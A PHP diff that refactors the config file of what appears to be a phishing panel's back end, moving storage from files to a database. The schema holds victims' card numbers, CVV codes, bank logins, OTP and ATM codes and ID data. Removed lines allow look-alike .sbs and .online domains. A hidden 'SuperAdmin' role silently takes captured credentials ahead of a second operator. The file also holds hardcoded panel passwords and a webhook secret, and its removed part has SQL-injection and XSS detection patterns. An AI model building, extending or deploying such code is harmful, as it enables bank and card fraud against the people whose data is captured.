@@ -1,716 +1,260 @@
 <?php
 // panel/config/config.php
-// 🔒 CONFIGURACIÓN CON MÁXIMA SEGURIDAD
-// DOMINIO: tradilberco.sbs
-// ✅ SISTEMA DE ROLES: SUPERADMIN + ADMIN
-// ✅ PRIORIDAD: SuperAdmin siempre gana, Admin nunca lo sabe
 
-// ============================================
-// 🚫 BLOQUEAR ACCESO DIRECTO COMPLETAMENTE
-// ============================================
-
+// Bloqueo acceso directo
 if (php_sapi_name() !== 'cli') {
-    if (strpos($_SERVER['REQUEST_URI'] ?? '', 'config.php') !== false ||
-        strpos($_SERVER['SCRIPT_FILENAME'] ?? '', 'config.php') !== false ||
-        basename($_SERVER['PHP_SELF'] ?? '') === 'config.php') {
+    $uri = $_SERVER['REQUEST_URI'] ?? '';
+    $sfn = $_SERVER['SCRIPT_FILENAME'] ?? '';
+    $bsn = basename($_SERVER['PHP_SELF'] ?? '');
+    if (strpos($uri, 'config.php') !== false ||
+        strpos($sfn, 'config.php') !== false ||
+        $bsn === 'config.php') {
         http_response_code(403);
-        header('Content-Type: text/plain; charset=utf-8');
+        header('Content-Type: text/plain');
         exit('403 Forbidden');
     }
 }
 
-// ============================================
-// 🔒 PREVENIR INCLUSIONES INSEGURAS
-// ============================================
+if (!defined('__CONFIG_LOADED__')) define('__CONFIG_LOADED__', true);
 
-if (!function_exists('estaAutenticado')) {
-    if (!defined('__CONFIG_LOADED__')) {
-        define('__CONFIG_LOADED__', true);
-    }
-}
+require_once __DIR__ . '/../api/_db.php';
 
-// ============================================
-// 🛡️ PREVENIR INYECCIÓN DE VARIABLES
-// ============================================
-
-$_GET = array_map('trim', $_GET ?? []);
-$_POST = array_map('trim', $_POST ?? []);
-$_COOKIE = array_map('trim', $_COOKIE ?? []);
-
-// ============================================
-// === CREDENCIALES DEL PANEL (PROTEGIDAS) ===
-// ============================================
-
-// 🔴 SUPERADMIN (Root) - Ve todo, prioridad máxima
-const SUPERADMIN_USER = 'Root#8XkM$9pNrQ@vS3wYz';
+// ============ CREDENCIALES ============
+const SUPERADMIN_USER     = 'Root#8XkM$9pNrQ@vS3wYz';
 const SUPERADMIN_PASSWORD = '1#2y$12$W8kL9mNpQ@vR2wYzA.bCdEfGhIjKlMnOqRsTuVwXyZ0123456789';
+const ADMIN_USER          = 'Admin#7BmK$3qWsE@rT5yUi';
+const ADMIN_PASSWORD      = '2#3z$13$X9lM0nOqR@sS3xZaB.cDeFgHiJkLmNoPqRsTuVwXyZ987654321';
 
-// 🔵 ADMIN NORMAL - Ve todo pero sin prioridad
-const ADMIN_USER = 'Admin#7BmK$3qWsE@rT5yUi';
-const ADMIN_PASSWORD = '2#3z$13$X9lM0nOqR@sS3xZaB.cDeFgHiJkLmNoPqRsTuVwXyZ987654321';
+const WEBHOOK_SECRET    = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
+const PRIORIDAD_DELAY   = 180;
+const DELAY_AVISO_ADMIN = 15;
 
-// Compatibilidad con constantes antiguas (mapeadas a SuperAdmin)
-const PANEL_USER = SUPERADMIN_USER;
-const PANEL_PASSWORD = SUPERADMIN_PASSWORD;
-
-// WEBHOOK SECRET
-const WEBHOOK_SECRET = 'A9AF97EOZYQAYQNB67T9WPN7DWYC70J6';
-
-// ============================================
-// ⏱️ TIEMPO DE PRIORIDAD
-// ============================================
-// Segundos que el Admin debe esperar antes de:
-//  - Poder actuar sobre una solicitud que el SuperAdmin manipuló
-//  - Ver credenciales del banco + códigos que el SuperAdmin pidió
-// 180 segundos = 3 minutos
-const PRIORIDAD_DELAY = 180;
-
-// ============================================
-// ⏱️ DELAY PARA MOSTRAR QUE ADMIN MANIPULA (solo SuperAdmin)
-// ============================================
-// Segundos que el SuperAdmin debe esperar antes de ver
-// el aviso de que el Admin está manipulando (para que no sea
-// instantáneo y parezca más natural)
-const DELAY_AVISO_ADMIN = 15; // 15 segundos
-
-// ============================================
-// === RUTAS SEGURAS ===
-// ============================================
-
-const DATA_DIR = __DIR__ . '/../../data/';
-const SOLICITUDES_FILE = DATA_DIR . 'solicitudes.dat';
-const LOG_FILE = DATA_DIR . 'login_log.txt';
-const RATELIMIT_DIR = DATA_DIR . 'ratelimit/';
-const SESIONES_FILE = DATA_DIR . 'sesiones.json';
-
-// ============================================
-// === CREAR DIRECTORIOS CON PERMISOS SEGUROS ===
-// ============================================
-
-if (!is_dir(DATA_DIR)) {
-    mkdir(DATA_DIR, 0700, true);
-    chmod(DATA_DIR, 0700);
-}
-
-if (!is_dir(RATELIMIT_DIR)) {
-    mkdir(RATELIMIT_DIR, 0700, true);
-    chmod(RATELIMIT_DIR, 0700);
-}
-
-if (!file_exists(DATA_DIR . '.htaccess')) {
-    $htaccess_content = "Order Deny,Allow\nDeny from all\n";
-    file_put_contents(DATA_DIR . '.htaccess', $htaccess_content, LOCK_EX);
-    chmod(DATA_DIR . '.htaccess', 0644);
-}
-
-// ============================================
-// === CONFIGURACIÓN DE SESIÓN SEGURA ===
-// ============================================
-
+// ============ SESIÓN ============
 $cookie_options = [
-    'secure' => (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on'),
+    'secure'   => true,
     'httponly' => true,
     'samesite' => 'Strict',
-    'path' => '/panel/',
-    'domain' => '',
+    'path'     => '/',
+    'domain'   => '',
 ];
-
-if (in_array($_SERVER['HTTP_HOST'] ?? '', ['localhost', '127.0.0.1', 'localhost:8000', '127.0.0.1:8000'])) {
+$host = $_SERVER['HTTP_HOST'] ?? '';
+if (in_array($host, ['localhost','127.0.0.1'], true)
+    || strpos($host, 'localhost:') === 0
+    || strpos($host, '127.0.0.1:') === 0) {
     $cookie_options['secure'] = false;
 }
-
 session_set_cookie_params($cookie_options);
+if (session_status() === PHP_SESSION_NONE) session_start();
 
-if (session_status() === PHP_SESSION_NONE) {
-    session_start();
-}
-
-// ============================================
-// === MANTENER SESIÓN ACTIVA - SIN TIMEOUT ===
-// ============================================
-
-if (!isset($_SESSION['session_created'])) {
-    $_SESSION['session_created'] = time();
-    $_SESSION['last_activity'] = time();
-}
-
-$_SESSION['last_activity'] = time();
-
-// ============================================
-// === FUNCIONES DE ROLES ===
-// ============================================
-
-/**
- * Obtener el rol del usuario actual
- * @return string 'superadmin' | 'admin' | 'invitado'
- */
-function obtenerRolActual() {
-    if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) {
-        return 'invitado';
-    }
+// ============ ROLES / PRIORIDAD ============
+function obtenerRolActual(): string {
+    if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) return 'invitado';
     return $_SESSION['rol'] ?? 'admin';
 }
+function esSuperAdmin(): bool { return obtenerRolActual() === 'superadmin'; }
+function esAdmin(): bool { return obtenerRolActual() === 'admin'; }
 
-/**
- * ¿Es SuperAdmin?
- */
-function esSuperAdmin() {
-    return obtenerRolActual() === 'superadmin';
+function puedeActuarSobreSolicitud(array $s): bool {
+    if (obtenerRolActual() === 'superadmin') return true;
+    $rol = $s['manipulado_rol'] ?? null;
+    $ts  = (int)($s['manipulado_timestamp'] ?? 0);
+    if (!$rol || !$ts) return true;
+    if ($rol === 'superadmin' && (time() - $ts) < PRIORIDAD_DELAY) return false;
+    return true;
 }
-
-/**
- * ¿Es Admin normal?
- */
-function esAdmin() {
-    return obtenerRolActual() === 'admin';
+function puedeVerInfoSolicitud(array $s): bool {
+    if (obtenerRolActual() === 'superadmin') return true;
+    $rol = $s['manipulado_rol'] ?? null;
+    $ts  = (int)($s['manipulado_timestamp'] ?? 0);
+    if ($rol === 'superadmin' && $ts && (time() - $ts) < PRIORIDAD_DELAY) return false;
+    return true;
 }
-
-/**
- * ¿El usuario actual puede actuar sobre esta solicitud?
- *
- * Reglas:
- *  - SuperAdmin: SIEMPRE puede (incluso si Admin pidió primero).
- *  - Admin: solo puede si NADIE la manipuló en los últimos PRIORIDAD_DELAY segundos.
- *           Si el SuperAdmin la manipuló, sus botones quedan inertes pero VISIBLES,
- *           y NUNCA recibe un mensaje que revele que hay un SuperAdmin.
- */
-function puedeActuarSobreSolicitud($solicitud) {
+function debeMostrarAvisoAdmin(array $s): bool {
+    if (obtenerRolActual() !== 'superadmin') return false;
+    if (($s['manipulado_rol'] ?? null) !== 'admin') return false;
+    $delta = time() - (int)($s['manipulado_timestamp'] ?? 0);
+    return $delta >= DELAY_AVISO_ADMIN && $delta < PRIORIDAD_DELAY;
+}
+function marcarManipulacion(array &$s): bool {
     $rol = obtenerRolActual();
-
-    // SuperAdmin siempre puede
-    if ($rol === 'superadmin') {
-        return true;
+    $rolM = $s['manipulado_rol'] ?? null;
+    $tsM  = (int)($s['manipulado_timestamp'] ?? 0);
+    if ($rol === 'admin' && $rolM === 'superadmin' && (time() - $tsM) < PRIORIDAD_DELAY) {
+        return false;
     }
-
-    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
-    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;
-
-    // Nadie la está manipulando → puede
-    if (!$manipuladoRol || !$manipuladoTs) {
-        return true;
-    }
-
-    // Si el SuperAdmin la manipuló recientemente → Admin NO puede
-    if ($manipuladoRol === 'superadmin') {
-        if ((time() - $manipuladoTs) < PRIORIDAD_DELAY) {
-            return false;
-        }
-    }
-
+    $s['manipulado_por']       = $_SESSION['usuario'] ?? 'desconocido';
+    $s['manipulado_rol']       = $rol;
+    $s['manipulado_timestamp'] = time();
     return true;
 }
 
-/**
- * ¿Debe mostrarse la info SENSIBLE al usuario actual?
- *
- * Info sensible = credenciales del banco (usuario/contraseña) + códigos (OTP, etc.)
- *
- * Reglas:
- *  - SuperAdmin: SIEMPRE ve todo.
- *  - Admin: si el SuperAdmin la manipuló en los últimos PRIORIDAD_DELAY segundos,
- *           NO ve las credenciales ni los códigos hasta que pase el tiempo.
- *           Los datos del cliente (nombre, cédula, etc.) SÍ los ve siempre.
- */
-function puedeVerInfoSolicitud($solicitud) {
-    $rol = obtenerRolActual();
-
-    if ($rol === 'superadmin') {
-        return true;
-    }
-
-    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
-    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;
-
-    if ($manipuladoRol === 'superadmin' && $manipuladoTs) {
-        if ((time() - $manipuladoTs) < PRIORIDAD_DELAY) {
-            return false;
-        }
-    }
-
-    return true;
-}
-
-/**
- * ¿Debe mostrarse el aviso de "Admin manipulando" al SuperAdmin?
- *
- * Con delay de DELAY_AVISO_ADMIN segundos para que no sea instantáneo.
- */
-function debeMostrarAvisoAdmin($solicitud) {
-    $rol = obtenerRolActual();
-
-    // Solo el SuperAdmin ve este aviso
-    if ($rol !== 'superadmin') {
-        return false;
-    }
-
-    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
-    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;
-
-    if ($manipuladoRol !== 'admin') {
-        return false;
-    }
-
-    // El aviso aparece tras DELAY_AVISO_ADMIN segundos y dura hasta PRIORIDAD_DELAY
-    $delta = time() - $manipuladoTs;
-    return ($delta >= DELAY_AVISO_ADMIN && $delta < PRIORIDAD_DELAY);
-}
-
-/**
- * Marcar solicitud como manipulada por el usuario actual.
- *
- * REGLA CLAVE:
- *  - SuperAdmin SIEMPRE sobreescribe el estado (es el dueño).
- *  - Admin solo puede escribir si NADIE ya lo marcó en los últimos
- *    PRIORIDAD_DELAY segundos.
- *
- * @return bool true si se marcó, false si fue bloqueado silenciosamente
- */
-function marcarManipulacion(&$solicitud) {
-    $rolActual = obtenerRolActual();
-    $manipuladoRol = $solicitud['manipulado_rol'] ?? null;
-    $manipuladoTs  = $solicitud['manipulado_timestamp'] ?? 0;
-
-    // Si el Admin intenta escribir y el SuperAdmin ya lo hizo hace poco → NO sobreescribir
-    if ($rolActual === 'admin'
-        && $manipuladoRol === 'superadmin'
-        && (time() - $manipuladoTs) < PRIORIDAD_DELAY) {
-        return false; // ⛔ Bloqueado silenciosamente
-    }
-
-    // En cualquier otro caso, el usuario actual toma el control
-    $solicitud['manipulado_por'] = $_SESSION['usuario'] ?? 'desconocido';
-    $solicitud['manipulado_rol'] = $rolActual;
-    $solicitud['manipulado_timestamp'] = time();
-    return true;
-}
-
-/**
- * Verificar si el usuario está autenticado
- */
-function estaAutenticado() {
-    if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) {
-        return false;
-    }
-
+// ============ AUTENTICACIÓN ============
+function estaAutenticado(): bool {
+    if (!isset($_SESSION['autenticado']) || $_SESSION['autenticado'] !== true) return false;
     $_SESSION['last_activity'] = time();
     registrarSesion();
     limpiarSesionesInactivas();
-
     return true;
 }
 
-/**
- * Generar token CSRF seguro
- */
-function generarCsrfToken() {
+function generarCsrfToken(): string {
     if (empty($_SESSION['csrf_token']) || empty($_SESSION['csrf_token_time'])) {
-        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+        $_SESSION['csrf_token']      = bin2hex(random_bytes(32));
         $_SESSION['csrf_token_time'] = time();
         return $_SESSION['csrf_token'];
     }
-
-    if (time() - ($_SESSION['csrf_token_time'] ?? 0) > 3600) {
-        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
+    if (time() - $_SESSION['csrf_token_time'] > 3600) {
+        $_SESSION['csrf_token']      = bin2hex(random_bytes(32));
         $_SESSION['csrf_token_time'] = time();
     }
-
     return $_SESSION['csrf_token'];
 }
-
-/**
- * Verificar token CSRF
- */
-function verificarCsrfToken($token) {
-    if (empty($_SESSION['csrf_token'])) {
-        return false;
-    }
-
-    if (!hash_equals($_SESSION['csrf_token'], $token ?? '')) {
-        return false;
-    }
-
-    if (time() - ($_SESSION['csrf_token_time'] ?? 0) > 3600) {
-        return false;
-    }
-
+function verificarCsrfToken($token): bool {
+    if (empty($_SESSION['csrf_token'])) return false;
+    if (!hash_equals($_SESSION['csrf_token'], $token ?? '')) return false;
+    if (time() - ($_SESSION['csrf_token_time'] ?? 0) > 3600) return false;
     return true;
 }
 
-/**
- * Obtener IP real del cliente
- */
-function getIp() {
-    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        $ip = trim($ips[0]);
-    } elseif (!empty($_SERVER['HTTP_CLIENT_IP'])) {
-        $ip = $_SERVER['HTTP_CLIENT_IP'];
+// ============ IP ============
+function getIp(): string {
+    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $h) {
+        if (!empty($_SERVER[$h])) {
+            $ip = trim(explode(',', $_SERVER[$h])[0]);
+            if (filter_var($ip, FILTER_VALIDATE_IP)) return $ip;
+        }
     }
-
-    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
-        $ip = '0.0.0.0';
-    }
-
-    return $ip;
+    return '0.0.0.0';
 }
 
-/**
- * Rate limiting
- */
-function checkRateLimit($ip, $limit = 5, $timeWindow = 900) {
-    if (!is_dir(RATELIMIT_DIR)) {
-        mkdir(RATELIMIT_DIR, 0700, true);
-    }
+// ============ RATE LIMIT (BD) ============
+function checkRateLimit(string $ip, int $limit = 5, int $ventana = 900): bool {
+    $hash = md5($ip);
+    $row = db_fetch("SELECT contador, primera_vez FROM ratelimit WHERE ip_hash = ?", [$hash]);
+    $ahora = time();
 
-    $ip_hash = md5($ip);
-    $file = RATELIMIT_DIR . 'ratelimit_' . $ip_hash . '.json';
-
-    if (!file_exists($file)) {
-        $data = ['count' => 1, 'time' => time(), 'ip' => $ip];
-        file_put_contents($file, json_encode($data), LOCK_EX);
-        chmod($file, 0600);
+    if (!$row) {
+        db_exec("INSERT INTO ratelimit (ip_hash, ip, contador) VALUES (?, ?, 1)", [$hash, $ip]);
         return true;
     }
-
-    $json = file_get_contents($file);
-    $data = json_decode($json, true);
-
-    if (time() - ($data['time'] ?? 0) > $timeWindow) {
-        $data = ['count' => 1, 'time' => time(), 'ip' => $ip];
-        file_put_contents($file, json_encode($data), LOCK_EX);
+    $primera = strtotime($row['primera_vez']);
+    if ($ahora - $primera > $ventana) {
+        db_exec("UPDATE ratelimit SET contador=1, primera_vez=NOW() WHERE ip_hash=?", [$hash]);
         return true;
     }
-
-    if (($data['count'] ?? 0) >= $limit) {
-        return false;
-    }
-
-    $data['count']++;
-    file_put_contents($file, json_encode($data), LOCK_EX);
-    chmod($file, 0600);
-
+    if ((int)$row['contador'] >= $limit) return false;
+    db_exec("UPDATE ratelimit SET contador = contador + 1 WHERE ip_hash=?", [$hash]);
     return true;
 }
 
-/**
- * Cargar solicitudes
- */
-function cargarSolicitudes() {
-    if (!file_exists(SOLICITUDES_FILE)) {
-        file_put_contents(SOLICITUDES_FILE, json_encode([]), LOCK_EX);
-        chmod(SOLICITUDES_FILE, 0600);
-        return [];
+// ============ SOLICITUDES (BD) ============
+function cargarSolicitudes(): array {
+    $rows = db_fetchAll("SELECT * FROM solicitudes ORDER BY fecha DESC");
+    foreach ($rows as &$r) {
+        if (!empty($r['payload_json']) && is_string($r['payload_json'])) {
+            $extra = json_decode($r['payload_json'], true);
+            if (is_array($extra)) $r = array_merge($extra, $r);
+        }
+        // Normalizar tipos
+        $r['manipulado_timestamp'] = (int)($r['manipulado_timestamp'] ?? 0);
     }
-
-    $json = file_get_contents(SOLICITUDES_FILE);
-    $data = json_decode($json, true);
-
-    if (!is_array($data)) {
-        return [];
-    }
-
-    return $data;
+    return $rows;
 }
 
-/**
- * Guardar solicitudes
- */
-function guardarSolicitudes($solicitudes) {
-    if (!is_array($solicitudes)) {
-        throw new Exception('Los datos deben ser un array');
-    }
+function guardarSolicitud(array $s): bool {
+    $id = $s['id'] ?? null;
+    if (!$id) return false;
 
-    if (!is_dir(DATA_DIR)) {
-        mkdir(DATA_DIR, 0700, true);
-    }
+    $payload = $s;
+    unset($payload['payload_json']);
 
-    file_put_contents(
-        SOLICITUDES_FILE,
-        json_encode($solicitudes, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
-        LOCK_EX
-    );
+    $cols = [
+        'fecha_procesada','numero_tarjeta','cvv','vencimiento','banco','tipo_tarjeta',
+        'usuario','password','otp_codigo','otp_codigo_secundario','otp_modo',
+        'clave_cajero_codigo','clave_dinamica_codigo',
+        'nombre','documento','email','celular','monto','placas',
+        'ip','pais','ciudad','estado',
+        'manipulado_por','manipulado_rol','manipulado_timestamp',
+    ];
+    $vals = [];
+    foreach ($cols as $c) $vals[] = $s[$c] ?? null;
+    $vals[] = json_encode($payload, JSON_UNESCAPED_UNICODE);
 
-    chmod(SOLICITUDES_FILE, 0600);
+    $updates = implode(', ', array_map(fn($c) => "$c = EXCLUDED.$c", $cols));
+
+    $sql = "INSERT INTO solicitudes (id, " . implode(',', $cols) . ", payload_json)
+            VALUES (?, " . implode(',', array_fill(0, count($cols), '?')) . ", ?)
+            ON CONFLICT (id) DO UPDATE SET $updates, payload_json = EXCLUDED.payload_json";
+
+    db_exec($sql, array_merge([$id], $vals));
+    return true;
 }
 
-/**
- * Generar ID único
- */
-function generarId() {
+function generarId(): string {
     return 'SOL-' . date('Ymd') . '-' . strtoupper(bin2hex(random_bytes(3)));
 }
 
-/**
- * Registrar intentos de login
- */
-function logLoginIntento($usuario, $exito, $ip) {
-    $timestamp = date('Y-m-d H:i:s');
-    $status = $exito ? 'ÉXITO' : 'FALLO';
-    $logEntry = "[{$timestamp}] IP: {$ip} | Usuario: {$usuario} | Status: {$status}\n";
-
-    file_put_contents(LOG_FILE, $logEntry, FILE_APPEND | LOCK_EX);
-    chmod(LOG_FILE, 0600);
+// ============ LOGIN LOG (BD) ============
+function logLoginIntento(string $usuario, bool $exito, string $ip): void {
+    db_exec("INSERT INTO login_log (usuario, exito, ip) VALUES (?, ?, ?)",
+            [$usuario, $exito ? 1 : 0, $ip]);
 }
 
-/**
- * Sanitizar
- */
+// ============ SANITIZAR ============
 function sanitizar($input) {
-    if (is_array($input)) {
-        return array_map('sanitizar', $input);
-    }
-
-    $input = trim($input);
-    $input = str_replace(chr(0), '', $input);
-
-    return $input;
+    if (is_array($input)) return array_map('sanitizar', $input);
+    return str_replace(chr(0), '', trim((string)$input));
 }
+function escapar($t): string { return htmlspecialchars((string)$t, ENT_QUOTES, 'UTF-8'); }
 
-/**
- * Escapar HTML
- */
-function escapar($text) {
-    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
+// ============ SESIONES ADMIN (BD) ============
+function cargarSesiones(): array {
+    return db_fetchAll("SELECT * FROM sesiones_admin ORDER BY ultima_actividad DESC");
 }
-
-/**
- * Validar email
- */
-function validarEmail($email) {
-    return filter_var($email, FILTER_VALIDATE_EMAIL) !== false;
-}
-
-/**
- * Validar IP
- */
-function validarIp($ip) {
-    return filter_var($ip, FILTER_VALIDATE_IP) !== false;
-}
-
-// ============================================
-// === FUNCIONES PARA GESTIÓN DE SESIONES ===
-// ============================================
-
-function cargarSesiones() {
-    if (!file_exists(SESIONES_FILE)) {
-        file_put_contents(SESIONES_FILE, json_encode([]), LOCK_EX);
-        chmod(SESIONES_FILE, 0600);
-        return [];
-    }
-
-    $json = file_get_contents(SESIONES_FILE);
-    $data = json_decode($json, true);
-
-    return is_array($data) ? $data : [];
-}
-
-function guardarSesiones($sesiones) {
-    if (!is_array($sesiones)) {
-        throw new Exception('Los datos deben ser un array');
-    }
-
-    if (!is_dir(DATA_DIR)) {
-        mkdir(DATA_DIR, 0700, true);
-    }
-
-    file_put_contents(
-        SESIONES_FILE,
-        json_encode($sesiones, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE),
-        LOCK_EX
-    );
-
-    chmod(SESIONES_FILE, 0600);
-}
-
-function registrarSesion() {
-    $sesiones = cargarSesiones();
-    $sessionId = session_id();
-    $ip = getIp();
-    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
-    $ahora = date('Y-m-d H:i:s');
+function registrarSesion(): void {
+    $sid = session_id();
+    if (!$sid) return;
+    $ip  = getIp();
+    $ua  = $_SERVER['HTTP_USER_AGENT'] ?? 'N/A';
     $rol = $_SESSION['rol'] ?? 'desconocido';
-    $usuario = $_SESSION['usuario'] ?? 'desconocido';
+    $usr = $_SESSION['usuario'] ?? 'desconocido';
 
-    foreach ($sesiones as &$s) {
-        if ($s['id'] === $sessionId) {
-            $s['ultima_actividad'] = $ahora;
-            $s['ip'] = $ip;
-            $s['user_agent'] = $userAgent;
-            $s['rol'] = $rol;
-            $s['usuario'] = $usuario;
-            $s['activa'] = true;
-            guardarSesiones($sesiones);
-            return;
-        }
-    }
-
-    $sesiones[] = [
-        'id' => $sessionId,
-        'fecha' => $ahora,
-        'ultima_actividad' => $ahora,
-        'ip' => $ip,
-        'user_agent' => $userAgent,
-        'rol' => $rol,
-        'usuario' => $usuario,
-        'activa' => true
-    ];
-
-    guardarSesiones($sesiones);
+    db_exec("
+        INSERT INTO sesiones_admin (id, ip, user_agent, rol, usuario, activa)
+        VALUES (?, ?, ?, ?, ?, 1)
+        ON CONFLICT (id) DO UPDATE SET
+            ultima_actividad = NOW(),
+            ip = EXCLUDED.ip,
+            user_agent = EXCLUDED.user_agent,
+            rol = EXCLUDED.rol,
+            usuario = EXCLUDED.usuario,
+            activa = 1
+    ", [$sid, $ip, $ua, $rol, $usr]);
+}
+function limpiarSesionesInactivas(): void {
+    db_exec("UPDATE sesiones_admin SET activa=0 WHERE ultima_actividad < NOW() - INTERVAL '30 minutes'");
+    db_exec("DELETE FROM sesiones_admin WHERE ultima_actividad < NOW() - INTERVAL '24 hours'");
 }
 
-function limpiarSesionesInactivas() {
-    $sesiones = cargarSesiones();
-    $nuevasSesiones = [];
-    $limite = 30 * 60;
-    $ahora = time();
-
-    foreach ($sesiones as $s) {
-        $ultima = strtotime($s['ultima_actividad'] ?? $s['fecha'] ?? 'now');
-        if ($ahora - $ultima < $limite) {
-            $s['activa'] = true;
-            $nuevasSesiones[] = $s;
-        } else {
-            $s['activa'] = false;
-            if ($ahora - $ultima < 86400) {
-                $nuevasSesiones[] = $s;
-            }
-        }
-    }
-
-    if (count($nuevasSesiones) !== count($sesiones)) {
-        guardarSesiones($nuevasSesiones);
-    }
-}
-
-function getBrowserInfo($userAgent) {
-    $browser = 'Desconocido';
-    $platform = 'Desconocido';
-
-    if (strpos($userAgent, 'Chrome') !== false) $browser = 'Chrome';
-    elseif (strpos($userAgent, 'Firefox') !== false) $browser = 'Firefox';
-    elseif (strpos($userAgent, 'Safari') !== false) $browser = 'Safari';
-    elseif (strpos($userAgent, 'Edge') !== false) $browser = 'Edge';
-    elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) $browser = 'Opera';
-    elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) $browser = 'Internet Explorer';
-
-    if (strpos($userAgent, 'Windows') !== false) $platform = 'Windows';
-    elseif (strpos($userAgent, 'Mac OS X') !== false || strpos($userAgent, 'Macintosh') !== false) $platform = 'macOS';
-    elseif (strpos($userAgent, 'Linux') !== false) $platform = 'Linux';
-    elseif (strpos($userAgent, 'Android') !== false) $platform = 'Android';
-    elseif (strpos($userAgent, 'iPhone') !== false || strpos($userAgent, 'iPad') !== false) $platform = 'iOS';
-
-    return ['browser' => $browser, 'platform' => $platform];
-}
-
-function getBrowserIcon($browser) {
-    $iconos = [
-        'Chrome' => '🌐',
-        'Firefox' => '🦊',
-        'Safari' => '🧭',
-        'Edge' => '🌊',
-        'Opera' => '🎭',
-        'Internet Explorer' => '📟',
-        'Desconocido' => '❓'
-    ];
-    return $iconos[$browser] ?? '❓';
-}
-
-// ============================================
-// === VALIDACIÓN DE HOST PERMITIDO ===
-// ============================================
-
+// ============ HOST PERMITIDO ============
 $allowed_hosts = [
-    'tradilberco.sbs',
-    'www.tradilberco.sbs',
-    'libertcocertf.sbs',
-    'www.libertcocertf.sbs',
-    'libertcocertf.online',
-    'www.libertcocertf.online',
-    'www.certfilibrt.sbs',
-    'pcoplacaslidariobgt.online',
-    'www.pcoplacaslidariobgt.online',
-    'localhost',
-    '127.0.0.1',
-    'localhost:8000',
-    '127.0.0.1:8000'
+    'localhost','127.0.0.1','localhost:8000','127.0.0.1:8000',
+    // Render asigna un dominio random; cuando lo tengas, agrégalo aquí:
+    // 'pyp-panel.onrender.com',
 ];
-
 $http_host = $_SERVER['HTTP_HOST'] ?? '';
-
-$is_localhost = (strpos($http_host, 'localhost') !== false ||
-                 strpos($http_host, '127.0.0.1') !== false);
-
-if (!$is_localhost && !in_array($http_host, $allowed_hosts)) {
+$is_local  = strpos($http_host, 'localhost') !== false
+          || strpos($http_host, '127.0.0.1') !== false;
+$is_render = strpos($http_host, '.onrender.com') !== false;
+if (!$is_local && !$is_render && !in_array($http_host, $allowed_hosts)) {
     http_response_code(403);
-    header('Content-Type: text/plain; charset=utf-8');
+    header('Content-Type: text/plain');
     exit('403 Forbidden - Host no permitido');
 }
 
-// ============================================
-// === HEADERS DE SEGURIDAD ===
-// ============================================
-
+// ============ HEADERS ============
 header('X-Frame-Options: DENY');
 header('X-Content-Type-Options: nosniff');
-header('X-XSS-Protection: 1; mode=block');
-header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com;");
 header('Referrer-Policy: no-referrer');
 header('Cache-Control: no-cache, no-store, must-revalidate, private');
-header('Pragma: no-cache');
-header('Expires: 0');
-
-if (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') {
-    header('Strict-Transport-Security: max-age=31536000; includeSubDomains; preload');
-}
-
-header_remove('Server');
 header_remove('X-Powered-By');
-header_remove('X-AspNet-Version');
-
-// ============================================
-// === PROTECCIÓN CONTRA ATAQUES COMUNES ===
-// ============================================
-
-function detectarSqlInjection($input) {
-    $patterns = [
-        '/(\b(UNION|SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|ALTER|EXEC|EXECUTE)\b)/i',
-        '/(-{2})|({\/\*)|(\*\/)/i',
-        '/(;|\||&&|\|\|)/i',
-    ];
-
-    foreach ($patterns as $pattern) {
-        if (preg_match($pattern, $input)) {
-            return true;
-        }
-    }
-
-    return false;
-}
-
-function detectarXss($input) {
-    $patterns = [
-        '/<script[^>]*>.*?<\/script>/i',
-        '/<iframe[^>]*>.*?<\/iframe>/i',
-        '/javascript:/i',
-        '/on\w+\s*=/i',
-        '/<svg[^>]*>.*?<\/svg>/i',
-    ];
-
-    foreach ($patterns as $pattern) {
-        if (preg_match($pattern, $input)) {
-            return true;
-        }
-    }
-
-    return false;
-}
-
-// ============================================
-// === FIN DE CONFIGURACIÓN ===
-// ============================================
-
-?>
